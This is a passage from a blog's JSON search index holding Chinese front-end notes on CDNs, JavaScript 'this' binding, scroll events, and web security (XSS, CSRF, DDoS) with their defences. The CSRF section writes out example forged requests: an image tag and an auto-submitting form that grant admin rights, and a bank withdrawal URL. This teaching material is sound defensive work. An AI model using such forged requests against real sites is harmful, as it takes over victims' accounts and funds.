await","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"},{"name":"promise","slug":"promise","permalink":"https://shylees.github.io/tags/promise/"}]},{"title":"CDN内容分发网络","slug":"further/08 cdn","date":"2021-11-16T16:00:00.000Z","updated":"2021-12-16T16:00:00.000Z","comments":false,"path":"furtherNotes/further/08 cdn","link":"furtherNotes/further/08 cdn","permalink":"https://shylees.github.io/furtherNotes/further/08%20cdn","excerpt":"","text":"由前端安全引申出的 cdn 的知识 cdn 4.1 简介 CDN ( Content Delivery Network )，内容分发网络（跟菜鸟的仓配网络一样）。 主要思路： 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。 实现方法： 通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接和负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，加快访问速度。 目的： 使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。 优势： CDN节点解决了跨运营商和跨地域访问的问题，访问延时大大降低； 大部分请求在CDN边缘节点完成，CDN起到了分流作用，减轻了源站的负载。 4.2 组成 内容分发网络（CDN）是由多个节点组成的。一般来讲，CDN网络主要由中心节点、边缘节点两部分构成。 4.2.1 中心节点 中心节点包括CDN网管中心和全局负载均衡DNS重定向解析系统，负责整个CDN网络的分发及管理 4.2.2 边缘节点 CDN边缘节点主要指异地分发节点，由负载均衡设备、高速缓存服务器两部分组成。 负载均衡设备负责每个节点中各个Cache的负载均衡，保证节点的工作效率；同时还负责收集节点与周围环境的信息，保持与全局负载均衡DNS的通信，实现整个系统的负载均衡。 高速缓存服务器（Cache）负责存储客户网站的大量信息，就像一个靠近用户的网站服务器一样响应本地用户的访问请求。通过全局负载均衡DNS的控制，用户的请求被透明地指向离他最近的节点，节点中Cache服务器就像网站的原始服务器一样，响应终端用户的请求。因其距离用户更近，故其响应时间才更快。 中心节点就像仓配网络中负责货物调配的总仓，而边缘节点就是负责存储货物的各个城市的本地仓库。 4.3 基本工作流程 4.3.1 传统方式 用户在自己的浏览器中输入要访问的网站域名。 浏览器向 本地DNS服务器 请求对该域名的解析。 本地DNS服务器中如果缓存有这个域名的解析结果，则直接响应用户的解析请求。 本地DNS服务器中如果没有关于这个域名的解析结果的缓存，则以递归方式向整个DNS系统请求解析，获得应答后将结果反馈给浏览器。 浏览器得到域名解析结果，就是该域名相应的服务设备的 IP地址 。 浏览器向服务器请求内容。 服务器将用户请求内容传送给浏览器。 当使用了CDN时，DNS 服务器根据用户 IP 地址，将域名解析成相应节点的缓存服务器IP地址，实现用户就近访问。使用 CDN 服务的网站，只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备，将需要分发的内容注入 CDN，就可以实现内容加速了。 4.3.2 CDN 当用户点击网址页面上的内容 URL，经过本地 DNS 系统解析，DNS 系统会最终将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器。 CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求 CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这太设备发起请求 基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址： 根据用户 IP 地址，判断哪一台服务器距用户最近； 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容 查询各个服务器当前的负载请求，判断哪一台服务器尚有服务能能力 全局负载均衡设备把服务器 IP 地址返回给用户 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这服务器就要向他的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。 4.4 作用 CDN 最常用的功能是加速 加速访问 实现跨运营商、跨地域的全网覆盖 保障网络安全 CDN的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。 异地备援 节约成本 能克服网站分布不均的问题，投入使用CDN加速可以实现网站的全国铺设，你根据不用考虑购买服务器与后续的托管运维，服务器之间镜像同步，也不用为了管理维护技术人员而烦恼，并且能降低网站自身建设和维护成本。 让你更专注业务本身 CDN加速厂商一般都会提供一站式服务，业务不仅限于CDN，还有配套的云存储、大数据服务、视频云服务等，而且一般会提供7x24运维监控支持，保证网络随时畅通，你可以放心使用。并且将更多的精力投入到发展自身的核心业务之上。 4.5 工作原理 基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。 4.5.1 用户访问cdn资源的过程 用户向浏览器输入www.web.com这个域名，浏览器第一次发现本地没有DNS缓存，则向网站的DNS服务器请求； 网站的DNS域名解析器设置了CNAME，指向了www.web.51cdn.com,请求指向了CDN网络中的智能DNS负载均衡系统； 智能DNS负载均衡系统解析域名，把对用户响应速度最快的IP节点（CDN服务器）返回给用户； 用户向该IP节点（CDN服务器）发出请求； 由于是第一次访问，CDN服务器会向原web站点请求，并缓存内容； 请求结果发给用户。 4.5.2 cdn主要特点 本地Cache加速 提高了企业站点（尤其含有大量图片和静态页面站点）的访问速度，并大大提高以上性质站点的稳定性 镜像服务 消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。 远程加速 远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最快的Cache服务器，加快远程访问的速度 带宽优化 自动生成服务器的远程Mirror（镜像）cache服务器，远程用户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点WEB服务器负载等功能。 集群抗攻击 广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的影响，同时保证较好的服务质量 。 4.6 对网络的优化 解决服务器端的 “ 第一公里 ”问题 缓解甚至消除了不同运营商之间互联的瓶颈造成的影响 减轻了各省的出口带宽压力 缓解了骨干网的压力 优化了网上热点内容的分布 **第一公里：**指万维网流量向用户传送的第一个出口，是网站服务器接入互联网的链路所能提供的带宽。这个带宽决定了一个网站能为用户提供的访问速度和并发访问量。如果业务繁忙，用户的访问数越多，拥塞越严重，网站会在最需要向用户提供服务时失去用户。 **中间一公里：**代表互联网中节点与节点之间的传输网络 **最后一公里：**万维网流量向用户传送的最后一段接入链路 4.7 应用场景 网站站点 / 应用加速 视音频点播 / 大文件下载分发加速 视频直播加速 移动应用加速","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"前端安全","slug":"前端安全","permalink":"https://shylees.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}]},{"title":"节流throttle、防抖debounce","slug":"further/06 this指向 call bind apply","date":"2021-11-13T16:00:00.000Z","updated":"2021-11-13T16:00:00.000Z","comments":false,"path":"furtherNotes/further/06 this指向 call bind apply","link":"furtherNotes/further/06 this指向 call bind apply","permalink":"https://shylees.github.io/furtherNotes/further/06%20this%E6%8C%87%E5%90%91%20call%20bind%20apply","excerpt":"","text":"call、bind、apply、this 1. this 指向 this 永远指向最后调用它的那个对象（执行时） 匿名函数的 this 永远指向 window 非严格模式 全局对象 window 严格模式 全局对象是 undefined 2. 改变 this 指向 使用箭头函数 函数内部使用 _this = this 使用 apply、call、bind new 实例化对象 2.1 箭头函数 箭头函数的 this 始终指向函数定义时的 this，而非执行时。 箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则 undefined。 2.2 _this = this 相当于把 this 的值 保存在另一个变量 _this 2.3 apply、call、bind 2.3.1 apply apply() 方法调用一个函数，其具有一个指定的 this 值，以及 作为一个数组（类数组对象）通过的参数 func.apply(thisArg, [argsArray]) thisArg：在 func 函数运行时指定的 this 值。 注：指定的 this 值并不一定是该函数执行时真正的 this 值，如果函数处于非严格模式下，则指定为 null 或 undefined 会自动指向全局对象，值为原始值的 this 会指向该原始值的自动包装对象。 argsArrays：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。 如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。 2.3.2 call call 与 apply 基本类似，只有传入参数的不同 func.call(thisArg[, arg1[, arg2...]]) call 接收的 若干个参数列表 b.call(a, 1, 2) apply 接收 一个包含多个参数的数组 b.apply(a, [1,2]) 2.3.3 bind bind() 方法创建一个新的函数，所以需要被调用。 b.bind(a, 1, 2)() 2.4 函数调用 方法种类： 作为一个函数被调用 12function a()&#123;...&#125;a(); 作为对象的方法被调用 12let a = &#123; fn : function()&#123; ... &#125; &#125;;a.fn(); 使用构造函数调用函数 12345function func(arg)&#123; this.age = arg;&#125;let a = new func(18)a.age; 作为函数方法调用函数（ call、apply） 在 js 中，函数是对象。 js 函数有自己的属性和方法，其中 call() 和 apply() 是预定义的函数方法， 其可用于调用函数，两个方法的第一个参数必须是对象本事。 在 严格模式，调用函数时 第一个参数会成为 this 的值，即使该参数不是一个对象 在非严格模式，如果第一参数是 null / undefined，将使用全局对象替代","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"触底事件","slug":"further/07 滚动条触底事件","date":"2021-11-13T16:00:00.000Z","updated":"2021-11-13T16:00:00.000Z","comments":false,"path":"furtherNotes/further/07 滚动条触底事件","link":"furtherNotes/further/07 滚动条触底事件","permalink":"https://shylees.github.io/furtherNotes/further/07%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E8%A7%A6%E5%BA%95%E4%BA%8B%E4%BB%B6","excerpt":"","text":"判断是否到达页面底部 123456789$(window).scroll(function () &#123; if ($(&#x27;html, body&#x27;).scrollTop() + window.innerHeight &gt;= Math.floor($(&#x27;html&#x27;).outerHeight(true))) &#123; if (PART == 1) &#123; loadingNextPART1(); &#125; else if (PART == 2) &#123; loadingNextPART2(); &#125; &#125;&#125;）","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"关于网络攻击那些事儿~","slug":"further/08 前端安全","date":"2021-11-13T16:00:00.000Z","updated":"2021-12-03T16:00:00.000Z","comments":false,"path":"furtherNotes/further/08 前端安全","link":"furtherNotes/further/08 前端安全","permalink":"https://shylees.github.io/furtherNotes/further/08%20%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8","excerpt":"","text":"参考链接： xss xss csrf csrf csrf ddos cdn 点击劫持 点击劫持 点击劫持 HTST 前端安全 前端安全 XSS CSRF DDoS CDN 劫持 iframe opener ClickJacking 点击劫持 HSTS（HTTP严格传输安全） 泛洪 1. XSS攻击 — 跨站脚本攻击 1.1 简介 XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。 本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行 1.2 攻击的危害 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。 可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。 1.3 注入方式 在 html 中内嵌的文本中，恶意内容以 script 标签形式注入； 在内联的 javascript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等） 在标签属性中，恶意内容包含引号，突破属性值的限制，注入其他属性或标签； 在标签的href、src等属性中，包含 javascript: 等可执行代码； 在 onload、onerror、onclick 等事件中，注入不受控制代码； 在 style 属性和标签中，包含类似 background-image:url(‘javascript : ...’);的代码 在 style 属性和标签中，包含类似 expression(...) 的css表达式代码 总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 html 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造成恶意的代码指令，进而利用恶意代码危害数据安全。 1.3 分类 1.3.1存储型 XSS 攻击 在表单输入一段 脚本，然后这段脚本会存在数据库里，每当其他用户从数据库拿到数据渲染到页面上时，会有这一段脚本存在，当用户触发后，自己的数据就会被发送到非法服务器。 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。 1.3.2 反射型 XSS 攻击 url 里面 放 脚本，发送请求，该请求的 查询字符串会被作为 dom 节点的 内容 放到html里执行，黑客就可以利用该脚本做一些恶意操作。 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。 反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。 1.3.3 基于 DOM 的 XSS 攻击 跟 web 服务器没有关系 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据 1.4 阻止预防 1.4.1 总结上述攻击特点 https://juejin.cn/post/6844903685122703367#heading-8 通过前面的介绍可以得知，XSS 攻击有两大要素： 攻击者提交恶意代码。 浏览器执行恶意代码。 针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？ 输入过滤: 前端过滤输入，然后提交到后端？不可行，一旦攻击者绕过前端过滤，直接构造请求，就可以提交尔恶意代码了 后端写入数据库前，对输入进行过滤，然后将安全内容返回给前端？不可行在提交阶段，不确定内容要输出到哪里：可能同时提供给 前端和客户端，if 转码 客户端显示的内容是转码后的内容；在前端中不同的位置所需的编码也不一样。 输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的 那就只能： 防止浏览器执行恶意代码 防止 html 中出现注入 防止 JavaScript 执行时，执行恶意代码 1.4.2 预防存储型和反射型xss攻击 存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。 预防这两种漏洞，有两种常见做法： 改成纯前端渲染，把代码和数据分隔开。 对 HTML 做充分转义。 转义应该在输出 HTML 时进行，而不是在提交用户输入时 1.4.2.1 纯前端渲染 纯前端渲染的过程： 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。 在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。 1.4.2.2 转义 html 如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; ' / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善： XSS 安全漏洞 简单转义是否有防护作用 HTML 标签文字内容 有 HTML 属性值 有 CSS 内联样式 无 内联 JavaScript 无 内联 JSON 无 跳转链接 无 所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。 1.4.2.3 总结 存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。 而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。 共同点：先往浏览器中注入恶意脚本，再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。 所以可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。 1.4.3 预防 dom 型 DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。 1.4.4 其他通用预防方案 利用 CSP CSP 的功能 限制加载其他域下的资源文件 禁止向第三方域提交数据，用户数据不会外泄 禁止执行内联脚本和未授权脚本 提供上报机制，帮助发现 XSS 攻击 使用 httpOnly 因为很多 XSS 攻击都是用来盗 cookie 的，可以通过使用 httpOnly 属性来爆出cookie 通常服务器可以将 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的 使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。 打开谷歌的响应头 12345set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly 使用组件 前端防御组件 js-xss 1234567npm install xssvar xss = require(&#x27;xss&#x27;)$(&#x27;btnSure&#x27;).on(&#x27;click&#x27;,function()&#123; let result = xss($(&#x27;.input&#x27;).val()) putout.html(result)&#125;) 限制输入内容长度 不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。 1.4.5 减少攻击的产生 利用模板引擎：自带html转移功能 避免内联事件 避免拼接 html 增加攻击难度，降低攻击后果 主动检测和发现：用 xss 攻击字符串和自动扫描工具寻找潜在的 xss 漏洞 2. CSRF攻击 — 跨站请求伪造 CSRF（Cross-site request forgery）跨站请求伪造，是一种利用网站可信用户的权限去执行未授权的命令的一种恶意攻击。也称作 one-click attack 或者 session riding，其简写有时候也会使用 XSRF。 CSRF ： 攻击者利用受害者的身份，以受害者的名义发送恶意请求。利用用户当前身份做一些未经过授权的事。 XSS ： 目的是获取用户的身份信息。攻击者窃取用户身份( session / cookie )。 2.1 CSRF 的危害 CSRF可以盗用受害者的身份，完成受害者在web浏览器有权限进行的任何操作… 以你的名义发送诈骗邮件，消息 用你的账号购买商品 用你的名义完成虚拟货币转账 泄露个人隐私 2.2 产生 CSRF 条件 目标站点一定要有 CSRF 漏洞； 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态； 受害者有意或者无意的访问了攻击者发布的页面或者链接地址 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”，**并且通过广告等诱使 Bob 来访问他的网站。**当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，**如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，**钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 与 XSS 不同，CSRF 不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以对于 CSRF 我们主要的防护手段是提升服务器的安全性 2.3 产生的方式 GET 请求 1&lt;img src=&quot;http://a.com/user/grant_super_user/121&quot; /&gt; 攻击者 121 想将自己的身份添加为网站管理员，然后他发了一个网站会加载的图片到帖子上，其地址为上述 图片地址 ，请求到了后台数据 POST 请求 12345678&lt;script&gt;$(function() &#123; $(&#x27;#CSRF_forCSRFm&#x27;).trigger(&#x27;submit&#x27;);&#125;);&lt;/script&gt;&lt;form action=&quot;http://a.com/user/grant_super_user&quot; id=&quot;CSRF_form&quot; method=&quot;post&quot;&gt; &lt;input name=&quot;uid&quot; value=&quot;121&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt; 伪造一个用户打开黑客站点时能自动提交的表单发送 POST 请求 诱导用户点击链接 1234&lt;div&gt; &lt;img src=&quot;...&quot;&gt; &lt;a herf=&quot;放黑客要操作的链接&quot;&gt;&lt;/a&gt;&lt;/div&gt; 诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上 一旦用户点击了这个链接，那么就会被黑客利用他的账户做一些没有被本人授权的事情 利用服务器的漏洞和用户的登录状态来实施攻击 2.4 如何防止 CSRF 攻击 2.4.1 利用 Cookie 的 SameSite 属性 黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据。 通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 http 请求时，有如下区别： 如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效降低 CSRF 攻击的风险。 做法：在 HTTP 响应头，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。 SameSite 的值： Strict：浏览器会完全禁止第三方Cookie； Lax：跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果使用 Post 方法，或通过 img、iframe 等标签加载的 URL，都不会携带 Cookie。 None：在任何请求的会发送 Cookie 数据 2.4.2 同源检测 服务器验证请求的来源站点。在 HTTP 协议中，每一个异步请求都会携带上两个 Header，用户标记来源域名： Origin：通过 XMLHttpRequest、Fecth 发起跨站请求或通过 Post 方法发送请求时，都会带上 Origin 属性 只包含域名信息 且再两种情况下不会存在： IE11同源策略、302重定向 Referer：记录了该 HTTP 请求的来源地址 if 从 极客时间的官网打开 InfoQ 的站点，那么 Referer 为 极客时间详细的 url 所以服务器的策略是优先判断 Origin，if 无 Origin，再根据实际情况判断是否使用 referer. 2.4.3 CSRF Token CSRF 中 攻击者无法直接窃取到用户的信息— cookie、header、网站内容等，仅仅是毛用 cookie 的信息。 而 CSRF 成功的原因是，服务器误把攻击者发送的请求当成用户自己的请求。所以可以要求所有的用户请求都携带一个 CSRF 无法获取到的 Token。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开。 浏览器向服务器发送请求时，服务器生成一个 CSRF Token，然后将该字符串植入到返回的页面中 浏览器若要发起什么请求时，需要带上页面的 CSRF token，服务器会验证其是否合法。若时第三方站点发出的请求，就无法获取到 CSRF token，所以即使发出了请求，服务器也会拒绝。 3. DDos 攻击 — 分布式拒绝服务攻击 3.1 简介 其前身：DoS( Denial of Service )攻击，拒绝服务攻击，这种攻击行为使网站服务器充斥大量的要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷而停止提供正常的网络服务。 DDOS ( Distributed Denial of Service ) 分布式拒绝服务攻击，主要利用网络上现有的机器及系统的漏洞，攻占大量联网主机，使其成为攻击者的代理。当被控制的机器达到一定数量后，攻击者通过发送指令操纵这些攻击机同时向目标主机或网络发起 DoS 攻击，大量消耗其网络带宽和系统资源，导致该网络或系统瘫痪或停止提供正常的网络服务。 3.2 原理 一个比较完善的 DDoS 攻击体系分为：攻击者（ attacker / master ）、控制傀儡机（ demon / agent ）、受害者（ victim ）。 第2和第3部分，分别用做控制和实际发起攻击。第2部分的控制机只发布令而不参与实际的攻击，第3部分攻击傀儡机上发出DDoS的实际攻击包。 对第2和第3部分计算机，攻击者有控制权或者是部分的控制权，并把相应的DDoS程序上传到这些平台上，这些程序与正常的程序一样运行并等待来自攻击者的指令，通常它还会利用各种手段隐藏自己不被别人发现。 在平时，这些傀儡机器并没有什么异常，只是一旦攻击者连接到它们进行控制，并发出指令的时候，攻击愧儡机就成为攻击者去发起攻击了。 之所以采用这样的结构，一个重要的目的是隔离网络联系，保护攻击者，使其不会在攻击进行时受到监控系统的跟踪。同时也能够更好地协调进攻，因为攻击执行器的数目太多，同时由一个系统发布命令会造成控制系统的网络阻塞，影响攻击的突然性和协同性。 其过程为： 扫描大量主机以寻找可入侵主机目标 有安全漏洞的主机并获取控制器 入侵主机中安装攻击程序 用已入侵主机继续进行扫描和入侵 当受控制的攻击代理机达到攻击者满意的数量时。攻击者就可以通过攻击主控机随时发出击指令，一旦命令传送到攻击操纵机，主控机就可以关闭或脱离网络，以逃避追踪。 攻击操纵机将命令发布到攻击代理机，其接收到后，就开始向目标主机发出大量的服务请求数据包。 这些数据包经过伪装，使被攻击者无法识别它的来源面且，这些包所请求的服务往往要消耗较大的系统资源，如CP或网络带宽。如果数百台甚至上千台攻击代理机同时攻击一个目标，就会导致目标主机网络和系统资源的耗尽，从而停止服务。有时，甚至会导致系统崩溃。 这样还可以阻塞目标网络的防火墙和路由器等网络设备，进一步加重网络拥塞状况。于是，目标主机根本无法为用户提供任何服务。攻击者所用的协议都是一些非常常见的协议和服务。这样，系统管理员就难于区分恶意请求和正连接请求，从而无法有效分离出攻击数据包 3.3 表现形式 主要目的是让指定目标无注提供正常服务，甚至从互联网上消失 表现形式： 流量攻击：主要是针对网络带宽的攻击，即大量攻击包导致网络带宽被阻塞，合法网络包被虚假的攻击包淹没而无法到达主机 资源耗尽攻击：主要是针对服务器主机的政击，即通过大量攻击包导致主机的内存被耗尽或CPU内核及应用程序占完而造成无法提供网络服务 3.4 识别 Ping测试 Telnet测试 3.5 攻击方式 SYN/ACK Flood攻击 TCP全连接攻击 TCP刷 Script脚本攻击 3.6 防护策略 采用高性能的网络设备 尽量避免NAT的使用 充足的网络带宽保证 升级主机服务器硬件 把网站做成静态页面 4. 点击劫持 5. CDN 劫持 5.1 简介 [CDN（Content Delivery Network）内容分发网络](./08 cdn.md) 